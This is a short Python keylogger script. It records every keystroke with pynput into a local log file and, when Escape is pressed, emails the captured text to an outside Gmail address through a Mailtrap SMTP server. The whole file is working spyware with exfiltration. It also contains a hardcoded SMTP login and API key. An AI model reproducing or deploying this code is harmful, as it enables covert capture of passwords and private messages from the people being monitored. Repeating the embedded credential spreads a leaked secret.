from pynput.keyboard import Listener
import sys
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Function to log keystrokes
def addtofile(key):
    keydata = str(key).replace("'", "")  # Remove quotes around the key
    try:
        with open("log.txt", 'a') as f:
            if keydata == 'Key.space':
                f.write(' ')
            elif keydata == 'Key.enter':
                f.write('\n')
            elif keydata == 'Key.esc':
                send_email()  # Send email with the log content when Escape is pressed
                sys.exit()  # Exit the script after sending the email
            elif keydata.startswith("Key"):
                f.write(' [' + keydata + '] ')
            else:
                f.write(keydata)
    except Exception as e:
        print(f"Error writing to file: {e}")

# Function to send the log content via email
def send_email():
    # Read the content from the log file
    try:
        with open("log.txt", "r") as file:
            log_content = file.read()
    except Exception as e:
        print(f"Error reading the file: {e}")
        log_content = "Unable to read log file."

    sender = "goku <hello@demomailtrap.com>"
    receiver = "<superboiko124@gmail.com>"

    # Create the email message
    message = MIMEMultipart()
    message["From"] = sender
    message["To"] = receiver
    message["Subject"] = "Keystroke Log Content"

    # Attach the log content as the email body
    message.attach(MIMEText(log_content, "plain"))

    # Send the email using SMTP
    try:
        with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
            server.starttls()
            server.login("api", "1c5bfd794a9aa716ef911a2c2013d77c")  # Your Mailtrap login credentials
            server.sendmail(sender, receiver, message.as_string())
            print("Email sent successfully with the log content.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Start listening for keystrokes
with Listener(on_press=addtofile) as listener:
    listener.join()
